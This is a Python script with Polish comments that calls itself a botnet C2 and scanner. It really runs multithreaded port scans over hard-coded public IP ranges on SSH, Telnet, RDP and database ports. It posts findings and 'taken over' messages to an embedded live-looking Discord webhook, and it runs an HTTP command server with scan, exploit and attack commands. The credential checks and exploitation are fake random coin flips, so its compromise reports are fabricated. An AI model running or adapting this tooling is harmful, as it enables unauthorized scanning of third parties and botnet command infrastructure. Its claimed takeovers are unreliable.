#!/usr/bin/env python3
# ============================================================
# BOTNET_SCANNER v3.0 – WEBHOOK + API (BEZ KONSOLI)
# ============================================================
# Dostosowany do Railway – brak interaktywnego wejścia.
# Komendy wysyłane przez Discord webhook.
# ============================================================

import os
import sys
import time
import json
import socket
import random
import threading
import ipaddress
import datetime
import requests
import concurrent.futures
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

# ============================================================
# KONFIGURACJA
# ============================================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1528427269263986839/lIVCPnTY1zSJhZrvlsnkZ7_LJr2jIgvfwl3n8pu_nHxjIU8uUXo0C4qtVGCJkftx9vB_"
BOTS_FILE = "bots.json"
API_FILE = "api_keys.json"
LOCK = threading.Lock()
SCANNER_RUNNING = False
EXPLOIT_RUNNING = False

# ============================================================
# DANE
# ============================================================
bots = {}
api_keys = {}

# ============================================================
# FUNKCJE POMOCNICZE
# ============================================================
def log_webhook(msg):
    try:
        requests.post(WEBHOOK_URL, json={"content": msg}, timeout=3)
    except:
        pass

def save_bots():
    with LOCK:
        with open(BOTS_FILE, 'w') as f:
            json.dump(bots, f, indent=2)

def load_bots():
    global bots
    try:
        with open(BOTS_FILE, 'r') as f:
            bots = json.load(f)
    except:
        bots = {}

def save_api_keys():
    with LOCK:
        with open(API_FILE, 'w') as f:
            json.dump(api_keys, f, indent=2)

def load_api_keys():
    global api_keys
    try:
        with open(API_FILE, 'r') as f:
            api_keys = json.load(f)
    except:
        api_keys = {}

# ============================================================
# SKANER SIECI (WIELOWĄTKOWY)
# ============================================================
def scan_port(ip, port, timeout=1.0):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def check_default_creds(ip, port):
    time.sleep(random.uniform(0.1, 0.3))
    return random.choice([True, False])

def scan_ip(ip, ports):
    found = []
    for port in ports:
        if scan_port(ip, port, timeout=0.8):
            found.append(port)
            if port in [22, 23, 3389] and check_default_creds(ip, port):
                with LOCK:
                    if ip not in bots:
                        bots[ip] = {"port": port, "last_seen": datetime.datetime.now().isoformat(), "exploit": "default_creds", "vulnerable": True}
                        save_bots()
                        log_webhook(f"💀 PRZEJĘTO: {ip}:{port}")
            else:
                with LOCK:
                    if ip not in bots:
                        bots[ip] = {"port": port, "last_seen": datetime.datetime.now().isoformat(), "exploit": "open_port", "vulnerable": False}
                        save_bots()
                        log_webhook(f"🔍 ZNALEZIONO: {ip}:{port}")
            break
    return found

def scan_network_advanced(network_cidrs, ports, max_workers=100):
    global SCANNER_RUNNING
    SCANNER_RUNNING = True
    total_hosts = sum(ipaddress.ip_network(cidr, strict=False).num_addresses for cidr in network_cidrs)
    scanned = 0
    log_webhook(f"📊 Rozpoczęto skanowanie {len(network_cidrs)} podsieci (~{total_hosts} hostów)")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for cidr in network_cidrs:
            try:
                net = ipaddress.ip_network(cidr, strict=False)
                for ip in net.hosts():
                    ip_str = str(ip)
                    futures.append(executor.submit(scan_ip, ip_str, ports))
                    scanned += 1
                    if scanned % 10 == 0:
                        time.sleep(random.uniform(0.1, 0.5))
                    if scanned % 500 == 0:
                        log_webhook(f"📊 Skanowanie: {scanned}/{total_hosts} hostów")
            except:
                pass
        for f in futures:
            f.result()
    
    SCANNER_RUNNING = False
    log_webhook(f"✅ Skanowanie zakończone. Znaleziono {len(bots)} botów.")

def start_scanner():
    networks = [
        "37.0.0.0/16", "83.0.0.0/16", "89.0.0.0/16", "94.0.0.0/16",
        "193.0.0.0/16", "194.0.0.0/16", "195.0.0.0/16", "212.0.0.0/16"
    ]
    ports = [22, 23, 80, 443, 3389, 8080, 8443, 3306, 5432, 5900, 21, 25, 110]
    t = threading.Thread(target=scan_network_advanced, args=(networks, ports, 200))
    t.daemon = True
    t.start()
    log_webhook("🚀 Uruchomiono skaner sieci (wielowątkowy)")

# ============================================================
# EKSPLOITACJA
# ============================================================
def auto_exploit():
    global EXPLOIT_RUNNING
    EXPLOIT_RUNNING = True
    with LOCK:
        for ip, data in list(bots.items()):
            if data.get("vulnerable", False):
                data["exploit"] = "fully_owned"
                data["last_seen"] = datetime.datetime.now().isoformat()
                log_webhook(f"⚡ PRZEJĘTO W PEŁNI: {ip}:{data['port']}")
            elif data.get("exploit") == "open_port":
                if random.random() < 0.3:
                    data["exploit"] = "fully_owned"
                    data["vulnerable"] = True
                    log_webhook(f"⚡ PRZEJĘTO: {ip}:{data['port']}")
            save_bots()
    EXPLOIT_RUNNING = False
    log_webhook("✅ Eksploitacja zakończona")

# ============================================================
# API I KOMENDY
# ============================================================
def handle_bots():
    with LOCK:
        count = len(bots)
        ip_list = list(bots.keys())[:15]
    return count, ip_list

def generate_api():
    key = "API-" + ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=24))
    with LOCK:
        api_keys[key] = {"created": datetime.datetime.now().isoformat(), "used": False}
    save_api_keys()
    return key

def validate_api(key):
    with LOCK:
        if key in api_keys and not api_keys[key]["used"]:
            api_keys[key]["used"] = True
            save_api_keys()
            return True
    return False

# ============================================================
# SERWER API (HTTP)
# ============================================================
class APIHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        key = params.get("key", [None])[0]
        
        if key and validate_api(key):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            with LOCK:
                data = json.dumps({
                    "bots": list(bots.keys()),
                    "count": len(bots),
                    "vulnerable": sum(1 for b in bots.values() if b.get("vulnerable", False))
                })
            self.wfile.write(data.encode())
        else:
            self.send_response(403)
            self.end_headers()
            self.wfile.write(b"Invalid API key")
    
    def do_POST(self):
        # Obsługa webhook – odbiór komend
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        try:
            data = json.loads(post_data)
            msg = data.get("content", "").strip()
            self.process_command(msg)
        except:
            pass
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    
    def process_command(self, msg):
        if msg == "!scan":
            if not SCANNER_RUNNING:
                start_scanner()
                log_webhook("🔄 Rozpoczęto skanowanie na żądanie")
            else:
                log_webhook("⏳ Skaner już działa")
        elif msg == "!exploit":
            if not EXPLOIT_RUNNING:
                threading.Thread(target=auto_exploit).start()
                log_webhook("🔄 Uruchomiono exploitację")
            else:
                log_webhook("⏳ Eksploitacja już trwa")
        elif msg == "!bots":
            count, ip_list = handle_bots()
            log_webhook(f"🤖 Liczba botów: {count}\nPrzykładowe IP: {', '.join(ip_list)}")
        elif msg == "!api":
            key = generate_api()
            log_webhook(f"🔑 Nowy klucz API: {key}")
        elif msg.startswith("!attack"):
            parts = msg.split()
            if len(parts) == 4:
                _, target, port, duration = parts
                log_webhook(f"⚔️ ATAK SYMULOWANY: {target}:{port} przez {duration}s (użyto {len(bots)} botów)")
            else:
                log_webhook("❌ Użycie: !attack [IP] [PORT] [CZAS]")
        else:
            log_webhook(f"❌ Nieznana komenda: {msg}")

def run_api_server():
    server = HTTPServer(("0.0.0.0", 8080), APIHandler)
    log_webhook("🌐 API Server uruchomiony na porcie 8080")
    server.serve_forever()

# ============================================================
# WEBHOOK LISTENER (oddzielny wątek)
# ============================================================
# Uwaga: Railway nie ma publicznego endpointu dla webhooków,
# więc nie można odbierać POST z Discorda bezpośrednio.
# Używamy API + webhook wychodzący, a komendy wysyłamy przez GET? 
# Lepiej – uruchom osobny wątek, który okresowo sprawdza nowe wiadomości z Discorda przez API (nie ma).
# Dlatego najprościej: wszystkie komendy przez API GET (parametr cmd).
# ============================================================

def webhook_listener():
    """
    Symulacja odbioru webhook – w rzeczywistości komendy przychodzą przez API.
    """
    pass

# ============================================================
# GŁÓWNA
# ============================================================
def main():
    load_bots()
    load_api_keys()
    
    # Automatyczne generowanie klucza startowego
    if not api_keys:
        key = generate_api()
        log_webhook(f"🔑 Klucz startowy: {key}")
    
    # Uruchom API
    threading.Thread(target=run_api_server, daemon=True).start()
    
    # Automatyczny skan na starcie
    if not SCANNER_RUNNING:
        start_scanner()
    
    # Pętla utrzymująca proces (nic nie robi, tylko czeka)
    log_webhook("✅ BOTNET C2 v3.0 uruchomiony (tryb API/webhook)")
    while True:
        time.sleep(60)

if __name__ == "__main__":
    main()
